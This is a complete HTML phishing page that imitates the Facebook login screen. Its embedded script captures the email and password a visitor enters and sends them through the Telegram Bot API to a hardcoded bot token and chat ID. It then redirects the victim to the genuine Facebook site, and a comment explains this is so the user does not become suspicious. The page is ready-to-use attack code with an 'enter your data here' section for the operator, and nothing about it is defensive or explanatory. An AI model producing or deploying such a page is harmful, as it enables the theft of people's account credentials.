<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
        .container { width: 100%; max-width: 400px; margin: 50px auto; background-color: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 120px; }
        .login-form input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .login-form button { width: 100%; padding: 12px; background-color: #1877f2; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .login-form button:hover { background-color: #1566c9; }
        .footer { text-align: center; margin-top: 20px; font-size: 14px; color: #888; }
        .footer a { color: #1877f2; text-decoration: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <img src="https://static.vecteezy.com/system/resources/previews/017/221/797/original/facebook-logo-transparent-background-free-png.png" alt="Facebook Logo">
    </div>

    <div class="login-form">
        <input type="text" id="email" placeholder="Email or phone number" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="button" id="submitBtn">Log In</button>
    </div>

    <div class="footer">
        <a href="#">Forgotten account?</a> Â· <a href="#">Sign up for Facebook</a>
    </div>
</div>

<script>
    // --- PART 1: ENTER YOUR DATA HERE ---
    const BOT_TOKEN = "8538534265:AAFx5Ep3AI4DwwqwYBFa3HQ86eqIxpfv0Eo"; 
    const CHAT_ID = "6593370832";

    // --- PART 2: THE MAGIC SCRIPT ---
    document.getElementById('submitBtn').addEventListener('click', function() {
        const emailValue = document.getElementById('email').value;
        const passValue = document.getElementById('password').value;

        if(emailValue === "" || passValue === "") {
            alert("Please fill in all fields");
            return;
        }

        const message = `ðŸ”” NEW LOGIN ATTEMPT\n\nðŸ“§ Email: ${emailValue}\nðŸ”‘ Password: ${passValue}`;

        // Sending to Telegram
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        })
        .then(() => {
            // Redirect to the real Facebook after sending
            window.location.href = "https://www.facebook.com/login/device-based/regular/login/";
        })
        .catch(err => {
            console.error("Error sending message:", err);
            // Even if it fails, redirect anyway so user doesn't get suspicious
            window.location.href = "https://www.facebook.com";
        });
    });
</script>

</body>
</html>
